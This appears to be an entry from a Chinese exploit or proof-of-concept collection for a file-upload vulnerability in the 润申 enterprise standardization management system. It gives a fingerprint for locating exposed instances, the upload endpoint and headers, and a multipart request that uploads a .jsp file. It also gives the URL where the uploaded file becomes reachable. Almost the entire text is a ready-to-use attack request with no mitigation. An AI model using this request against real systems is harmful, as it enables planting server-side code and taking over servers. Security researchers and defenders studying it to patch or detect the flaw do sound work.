# 润申企业标准化管理系统addnewshandler文件上传漏洞

- **系统**：润申企业标准化管理系统addnewshandler　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="PDCA/js/_publicCom.js"`
- **请求**：`POST /dispatch/layuiIm/uploadImg HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307…`　`Content-Length: 151`

**请求体 / payload**
```
------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="1.jsp"
1
------WebKitFormBoundary7ctER307B0RaQwOp--
访问：http://ip//media/png/2024/4/22/1713787261034.jsp
```